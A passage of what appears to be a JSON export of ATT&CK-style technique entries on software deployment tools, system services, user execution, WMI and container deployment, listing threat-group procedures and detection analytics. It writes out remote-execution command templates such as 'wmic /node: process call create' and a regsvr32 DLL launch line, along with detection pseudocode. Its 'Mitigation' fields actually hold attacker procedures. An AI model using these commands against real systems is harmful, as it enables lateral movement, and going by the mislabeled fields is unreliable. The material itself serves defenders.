    "Description": "Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).  Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. Network infrastructure may also have administration tools that can be similarly abused by adversaries. [1]The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.",
    "Mitigation": [
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task.[2]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors used PDQ Deploy to move AvosLocker and tools across the network.[3]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used the commercially available tool RemoteExec for agentless remote code execution.[4]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has used RAdmin, a remote software tool used to remotely control workstations and ATMs.[5]"
      },
      {
        "id": "G0028",
        "name": "Threat Group-1314",
        "description": "Threat Group-1314 actors used a victim's endpoint management platform, Altiris, for lateral movement.[6]"
      },
      {
        "id": "S0041",
        "name": "Wiper",
        "description": "It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the Wiper malware.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Often these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.Perform application deployment at regular times so that irregular deployment activity stands out."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that does not correlate to known good software. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems."
      }
    ],
    "Subtechniques": "Execution, LateralMovement"
  },
  {
    "Title": "System Services",
    "Code": "T1569",
    "Description": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution.",
    "Mitigation": [
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has created system services to execute cryptocurrency mining software.[1]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor for command line invocations of tools capable of modifying services that doesn’t correspond to normal usage patterns and known software, patch cycles, etc."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may abuse system services or daemons to execute commands or programs."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may abuse system services or daemons to execute commands or programs."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Creation",
        "detects": "Monitor for newly constructed services/daemons to execute commands or programs."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys and/or values that may abuse system services or daemons to execute commands or programs."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1569.001",
        "name": "Launchctl"
      },
      {
        "id": "T1569.002",
        "name": "Service Execution"
      }
    ],
    "Tactic": "\nExecution"
  },
  {
    "Title": "User Execution",
    "Code": "T1204",
    "Description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of Phishing.While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.Adversaries may also deceive users into performing actions such as enabling Remote Access Software, allowing direct control of the system to the adversary, or downloading and executing malware for User Execution. For example, tech support scams can be facilitated through Phishing, vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or Remote Access Software.[1]",
    "Mitigation": [
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt, or install remote management software onto a corporate workstation, allowing LAPSUS$ to take control of an authenticated system.[2]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for third-party application logging, messaging, and/or other artifacts that may rely upon specific actions by a user in order to gain execution."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to Deobfuscate/Decode Files or Information in payloads."
      },
      {
        "id": "DS0032",
        "dsource": "Container",
        "dcomp": "Container Creation",
        "detects": "Monitor for newly constructed containers that may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Container Start",
        "detects": "Monitor for the activation or invocation of a container (ex: docker start or docker restart)"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe)."
      },
      {
        "id": "DS0007",
        "dsource": "Image",
        "dcomp": "Image Creation",
        "detects": "Monitor for newly constructed image that may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel."
      },
      {
        "id": "DS0030",
        "dsource": "Instance",
        "dcomp": "Instance Creation",
        "detects": "Monitor for newly constructed instances that may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Instance Start",
        "detects": "Monitor for the activation or invocation of an instance (ex: instance.start within GCP Audit Logs)"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed web-based network connections that are sent to malicious or suspicious destinations (e.g. destinations attributed to phishing campaigns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments (e.g. monitor anomalies in use of files that do not normally initiate network connections or unusual connections initiated by regsvr32.exe, rundll.exe, .SCF, HTA, MSI, DLLs, or msiexec.exe)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated with web-based network connections that are sent to malicious or suspicious detinations (e.g. destinations attributed to phishing campaigns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments (e.g. monitor anomalies in use of files that do not normally initiate network connections or unusual connections initiated by regsvr32.exe, rundll.exe, .SCF, HTA, MSI, DLLs, or msiexec.exe)."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to Deobfuscate/Decode Files or Information in payloads."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1204.001",
        "name": "Malicious Link"
      },
      {
        "id": "T1204.002",
        "name": "Malicious File"
      },
      {
        "id": "T1204.003",
        "name": "Malicious Image"
      }
    ],
    "Tactic": "\nExecution"
  },
  {
    "Title": "Windows Management Instrumentation",
    "Code": "T1047",
    "Description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model (DCOM) and Windows Remote Management (WinRM).[1] Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.[1][2]An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. [3] [2]",
    "Mitigation": [
      {
        "id": "C0025",
        "name": "2016 Ukraine Electric Power Attack",
        "description": "During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. [4]"
      },
      {
        "id": "S1028",
        "name": "Action RAT",
        "description": "Action RAT can use WMI to gather AV products installed on an infected host.[5]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla has used wmi queries to gather information from the system.[6]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 used WMI to steal credentials and execute backdoors at a future time.[7]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 used WMI to deploy their tools on remote machines and to gather information about the Outlook process.[8]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit.[9][10]"
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth uses WMIC to execute payloads. [11]"
      },
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon uses wmic.exe to delete shadow copies.[12]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can utilize WMI to collect system information, create new processes, and run malicious PowerShell scripts on a compromised machine.[13][14]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can execute a WMI query to gather information about the installed antivirus engine.[15][16]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta has used WMI to execute files over the network.[17]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat can use wmic.exe to delete shadow copies on compromised networks.[18]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "A BlackEnergy 2 plug-in uses WMI to gather victim host details.[19]"
      },
      {
        "id": "G0108",
        "name": "Blue Mockingbird",
        "description": "Blue Mockingbird has used wmic.exe to set environment variables.[20]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 can use WMI to move laterally.[21]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can use WMI to gather system information and to spawn processes for code injection.[22][23][24]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors used wmic and rundll32 to load Cobalt Strike onto a target host.[25]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors used WMIC to modify administrative settings on both a local and a remote host, likely as part of the first stages for their lateral movement; they also used WMI Provider Host (wmiprvse.exe) to execute a variety of encoded PowerShell scripts using the DownloadString method.[26][27]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider used Windows Management Instrumentation (WMI) to move laterally via Impacket.[28]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can use wmic to gather information from a system.[29]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used WMIC to execute remote commands.[30][31]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can use WMI to deliver a payload to a remote host.[32][33][25]"
      },
      {
        "id": "S0488",
        "name": "CrackMapExec",
        "description": "CrackMapExec can execute remote commands using Windows Management Instrumentation.[34]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can use WMI queries to obtain system information.[35]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can use WMI to execute commands.[36]"
      },
      {
        "id": "S0616",
        "name": "DEATHRANSOM",
        "description": "DEATHRANSOM has the ability to use WMI to delete volume shadow copies.[37]"
      },
      {
        "id": "G0009",
        "name": "Deep Panda",
        "description": "The Deep Panda group is known to utilize WMI for lateral movement.[38]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "The DustySky dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.[39]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca used a VBA script to execute WMI.[40]"
      },
      {
        "id": "S0605",
        "name": "EKANS",
        "description": "EKANS can use Windows Mangement Instrumentation (WMI) calls to execute operations.[41]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has used WMI to execute powershell.exe.[42]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can use WMI to deliver a payload to a remote host.[43]"
      },
      {
        "id": "S0396",
        "name": "EvilBunny",
        "description": "EvilBunny has used WMI to gather information about the system.[44]"
      },
      {
        "id": "S0568",
        "name": "EVILNUM",
        "description": "EVILNUM has used the Windows Management Instrumentation (WMI) tool to enumerate infected machines.[45]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT uses WMI to query the Windows Registry.[46]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has utilized WMI to execute commands and move laterally on compromised Windows machines.[47][48]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has used WMI to automate the remote execution of PowerShell scripts.[49]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has used WMI to install malware on targeted systems.[50]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution. FIN8 has also used WMIC and the Impacket suite for lateral movement, as well as during and post compromise cleanup activities.[51][52][53][54]"
      },
      {
        "id": "S0618",
        "name": "FIVEHANDS",
        "description": "FIVEHANDS can use WMI to delete files on a  target machine.[37][55]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy leverages WMI to enumerate anti-virus on the victim.[56]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version.[57]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can use WMI to open a Windows command shell on a remote machine.[58]"
      },
      {
        "id": "C0007",
        "name": "FunnyDream",
        "description": "During FunnyDream, the threat actors used wmiexec.vbs to run remote commands.[58]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.[59]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has used WMI to execute scripts used for discovery.[60]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).[61]"
      },
      {
        "id": "S0151",
        "name": "HALFBAKED",
        "description": "HALFBAKED can use WMI queries to gather system information.[62]"
      },
      {
        "id": "S0617",
        "name": "HELLOKITTY",
        "description": "HELLOKITTY can use WMI to delete volume shadow copies.[37]"
      },
      {
        "id": "S0698",
        "name": "HermeticWizard",
        "description": "HermeticWizard can use WMI to create a new process on a remote machine via C:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\\\regsvr32.exe /s /iC:\\windows\\<filename>.dll.[63]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.[64]"
      },
      {
        "id": "S0483",
        "name": "IcedID",
        "description": "IcedID has used WMI to execute binaries.[65]"
      },
      {
        "id": "S0357",
        "name": "Impacket",
        "description": "Impacket's wmiexec module can be used to execute commands through WMI.[66]"
      },
      {
        "id": "G0119",
        "name": "Indrik Spider",
        "description": "Indrik Spider has used WMIC to execute commands on remote computers.[67]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.[68]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar obtains a list of running processes through WMI querying.[69]"
      },
      {
        "id": "S0250",
        "name": "Koadic",
        "description": "Koadic can use WMI to execute commands.[70]"
      },
      {
        "id": "S0156",
        "name": "KOMPROGO",
        "description": "KOMPROGO is capable of running WMI queries.[71]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used WMIC for discovery as well as to execute payloads for persistence and lateral movement.[72][73][74][75]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has used WMI for execution.[76]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can use WMI to log into remote machines for propagation.[77]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used a tool to run cmd /c wmic computersystem get domain for discovery.[78]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has used WMI to attempt to delete the shadow volumes on a machine, and to connect a virtual machine to the network domain of the victim organization's network.[79][80]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.[81][82][83]"
      },
      {
        "id": "S0688",
        "name": "Meteor",
        "description": "Meteor can use wmic.exe as part of its effort to delete shadow copies.[84]"
      },
      {
        "id": "S0339",
        "name": "Micropsia",
        "description": "Micropsia searches for anti-virus software and firewall products installed on the victim’s machine using WMI.[85][86]"
      },
      {
        "id": "S0553",
        "name": "MoleNet",
        "description": "MoleNet can perform WMI commands on the system.[87]"
      },
      {
        "id": "S0256",
        "name": "Mosquito",
        "description": "Mosquito's installer uses WMI to search for antivirus display names.[88]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used malware that leveraged WMI for execution and querying host information.[89][90][91][92]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has executed PowerShell scripts via WMI.[93][94]"
      },
      {
        "id": "G0019",
        "name": "Naikon",
        "description": "Naikon has used WMIC.exe for lateral movement.[95]"
      },
      {
        "id": "S0457",
        "name": "Netwalker",
        "description": "Netwalker can use WMI to delete Shadow Volumes.[96]"
      },
      {
        "id": "S0368",
        "name": "NotPetya",
        "description": "NotPetya can use wmic to help propagate itself across a network.[97][98]"
      },
      {
        "id": "S0340",
        "name": "Octopus",
        "description": "Octopus has used wmic.exe for local discovery information.[99]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used WMI for execution.[100]"
      },
      {
        "id": "S0365",
        "name": "Olympic Destroyer",
        "description": "Olympic Destroyer uses WMI to help propagate itself across a network.[101]"
      },
      {
        "id": "S0264",
        "name": "OopsIE",
        "description": "OopsIE uses WMI to perform discovery techniques.[102]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group used WMIC to executed a remote XSL script.[103]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors has used WMI to execute commands.[104]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 has a number of modules that use WMI to execute tasks.[105]"
      },
      {
        "id": "S0194",
        "name": "PowerSploit",
        "description": "PowerSploit's Invoke-WmiCommand CodeExecution module uses WMI to execute and retrieve the output from a PowerShell payload.[106][107]"
      },
      {
        "id": "S0223",
        "name": "POWERSTATS",
        "description": "POWERSTATS can use WMI queries to retrieve data from compromised hosts.[108][90]"
      },
      {
        "id": "S0184",
        "name": "POWRUNER",
        "description": "POWRUNER may use WMI when collecting information about a victim.[109]"
      },
      {
        "id": "S0654",
        "name": "ProLock",
        "description": "ProLock can use WMIC to execute scripts on targeted hosts.[110]"
      },
      {
        "id": "S1032",
        "name": "PyDCrypt",
        "description": "PyDCrypt has attempted to execute with WMIC.[111]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can execute WMI queries to gather information.[112]"
      },
      {
        "id": "S0241",
        "name": "RATANKBA",
        "description": "RATANKBA uses WMI to perform process monitoring.[113][114]"
      },
      {
        "id": "S0375",
        "name": "Remexi",
        "description": "Remexi executes received commands with wmic.exe (for WMI commands). [115]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can use WMI to monitor for and kill specific processes listed in its configuration file.[116][117]"
      },
      {
        "id": "S0270",
        "name": "RogueRobin",
        "description": "RogueRobin uses various WMI queries to check if the sample is running in a sandbox.[118][119]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used Impacket’s WMIexec module for remote code execution and VBScript to run WMI queries.[4][120]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic can use WMI to execute PowerShell commands on a compromised machine.[121]"
      },
      {
        "id": "S0546",
        "name": "SharpStage",
        "description": "SharpStage can use WMI for execution.[87][122]"
      },
      {
        "id": "S0589",
        "name": "Sibot",
        "description": "Sibot has used WMI to discover network connections and configurations. Sibot has also used the Win32_Process class to execute a malicious DLL.[123]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can use WMI for lateral movement.[124]"
      },
      {
        "id": "S1086",
        "name": "Snip3",
        "description": "Snip3 can query the WMI class Win32_ComputerSystem to gather information.[125]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used WMI for the remote execution of files for lateral movement.[126][127]"
      },
      {
        "id": "G0038",
        "name": "Stealth Falcon",
        "description": "Stealth Falcon malware gathers system information via Windows Management Instrumentation (WMI).[128]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill has used the WMI command-line (WMIC) utility to run tasks.[129]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet used WMI with an explorer.exe token to execute on a remote share.[130]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST used the WMI query Select * From Win32_SystemDriver to retrieve a driver listing.[131]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can use WMI queries to detect the presence of a virtual machine environment.[132]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can use WMI for execution on a compromised host.[133]"
      },
      {
        "id": "G1018",
        "name": "TA2541",
        "description": "TA2541 has used WMI to query targeted systems for security products.[134]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "A Threat Group-3390 tool can use WMI to execute a binary.[135]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif droppers have used WMI classes to execute PowerShell commands.[136]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak can use wmic process call create in a scheduled task to launch plugins and for execution.[137]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has leveraged WMIC including for execution and remote system discovery.[138][139][140]"
      },
      {
        "id": "S0366",
        "name": "WannaCry",
        "description": "WannaCry utilizes wmic to delete shadow copies.[141][142][143]"
      },
      {
        "id": "G0112",
        "name": "Windshift",
        "description": "Windshift has used WMI to collect information about target machines.[144]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used WMI and LDAP queries for network discovery and to move laterally. Wizard Spider has also used batch scripts to leverage WMIC to deploy ransomware.[145][146][147][148][149]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "One variant of Zebrocy uses WMI queries to gather information.[150]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that are used to perform remote behavior"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor network traffic for WMI connections for potential use to remotely edit configuration, start services, or query files. When remote WMI requests are over RPC it connects to a DCOM interface within the RPC group netsvcs. To detect this activity, a sensor is needed at the network level that can decode RPC traffic or on the host where the communication can be detected more natively, such as Event Tracing for Windows. Using wireshark/tshark decoders, the WMI interfaces can be extracted so that WMI activity over RPC can be detected. Although the description details how to detect remote WMI precisely, a decent estimate has been to look for the string RPCSS within the initial RPC connection on 135/tcp. It returns a superset of this activity, and will trigger on all DCOM-related services running within RPC, which is likely to also be activity that should be detected between hosts. More about RPCSS at : rpcss_dcom_interfaces.htmlAfter the WMI connection has been initialized, a process can be remotely launched using the command: wmic /node:\"\" process call create \"\", which is detected in the third Detection Pseudocode. This leaves artifacts at both a network (RPC) and process (command line) level. When wmic.exe (or the schtasks API) is used to remotely create processes, Windows uses RPC (135/tcp) to communicate with the the remote machine.After RPC authenticates, the RPC endpoint mapper opens a high port connection, through which the schtasks Remote Procedure Call is actually implemented. With the right packet decoders, or by looking for certain byte streams in raw data, these functions can be identified.When the command line is executed, it has the parent process of C:\\windows\\system32\\wbem\\WmiPrvSE.exe. This analytic looks for these two events happening in sequence, so that the network connection and target process are output.Certain strings can be identifiers of the WMI by looking up the interface UUID for IRemUnknown2 in different formats- UUID 00000143-0000-0000-c000-000000000046 (decoded)- Hex 43 01 00 00 00 00 00 00 c0 00 00 00 00 00 00 46 (raw)- ASCII CF (printable text only)This identifier is present three times during the RPC request phase. Any sensor that has access to the byte code as raw, decoded, or ASCII could implement this analytic. The transfer syntax is- UUID 8a885d04-1ceb-11c9-9fe8-08002b104860 (decoded)- Hex 04 5d 88 8a eb 1c c9 11 9f e8 08 00 2b 10 48 60 (raw)- ASCII `]+H`` (printable text only)Thus, a great ASCII based signature is- CF]+HCFCFhost\"Note: To detect WMI over RPC (using DCOM), a sensor needs to exist that has the insight into individual connections and can actually decode and make sense of RPC traffic. Specifically, WMI can be detected by looking at RPC traffic where the target interface matches that of WMI, which is IRemUnknown2. Look for instances of the WMI querying in network traffic, and find the cases where a process is launched immediately after a connection is seen. This essentially merges the request to start a remote process via WMI with the process execution. If other processes are spawned from wmiprvse.exe in this time frame, it is possible for race conditions to occur, and the wrong process may be merged. If this is the case, it may be useful to look deeper into the network traffic to see if the desired command can be extracted. Analytic 1 - Remote WMI over RPCwmi_flow = filter network_flow where (dest_port == 135 and proto_info.rpc_interface == \"IRemUnknown2\") Analytic 2 : Remotely Launched Executables via WMIwmi_children = filter processes where (parent_process == \"wmiprvse.exe\")wmi_flow = filter network flow where (src_port ≥ 49152 and dest_port ≥ 49152 and proto_info.rpc_interface == \"IRemUnknown2\")remote_wmi_process = join wmi_children, wmi_flow where (wmi_flow.time < wmi_children.time < wmi_flow.time + 1 sec and wmi_flow.hostname == wmi_children.hostname"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly constructed processes and/or command-lines of \"wmic\". If the command line utility wmic.exe is used on the source host, then it can additionally be detected on an analytic. The command line on the source host is constructed into something like wmic.exe /node:\"\\<hostname>\" process call create \"\\<command line>\". It is possible to also connect via IP address, in which case the string \"\\<hostname>\" would instead look like IP Address. Processes can be created remotely via WMI in a few other ways, such as more direct API access or the built-in utility PowerShell.Note: Event IDs are for Sysmon (Event ID 10 - process access) and Windows Security Log (Event ID 4688 - a new process has been created). Besides executing arbitrary processes, wmic.exe can also be used to executed data stored in NTFS alternate data streams NTFS File Attributes.Looks for instances of wmic.exe as well as the substrings in the command line:- process call create- /node: Analytic 1 : Create Remote Process via WMIC processes = filter processes where ((event_id=\"10\" OR event_id=\"4688\") AND exe == \"wmic.exe\" AND command_line == \" process call create \")"
      },
      {
        "id": "DS0005",
        "dsource": "WMI",
        "dcomp": "WMI Creation",
        "detects": "Monitor for newly constructed WMI objects that will execute malicious commands and payloads."
      }
    ],
    "Subtechniques": "\nExecution"
  },
  {
    "Title": "Deploy Container",
    "Code": "T1610",
    "Description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.Containers can be deployed by various means, such as via Docker's create and start APIs or via a web application such as the Kubernetes dashboard or Kubeflow.[1][2][3] Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.[4]",
    "Mitigation": [
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki was run through a deployed container.[5]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing was run through a deployed Ubuntu container.[6]"
      },
      {
        "id": "S0683",
        "name": "Peirates",
        "description": "Peirates can deploy a pod that mounts its node’s root file system, then execute a command to create a reverse shell on the node.[7]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has deployed different types of containers into victim environments to facilitate execution.[8][9] TeamTNT has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges.[10]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Configuration management databases (CMDB) and other asset management systems may help with the detection of computer systems or network devices that should not exist on a network."
      },
      {
        "id": "DS0032",
        "dsource": "Container",
        "dcomp": "Container Creation",
        "detects": "Monitor for newly constructed containers that may deploy a container into an environment to facilitate execution or evade defenses."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Container Start",
        "detects": "Monitor for activation or invocation of a container that may deploy a container into an environment to facilitate execution or evade defenses."
      },
      {
        "id": "DS0014",
        "dsource": "Pod",
        "dcomp": "Pod Creation",
        "detects": "Monitor for newly constructed pods that may deploy a container into an environment to facilitate execution or evade defenses."
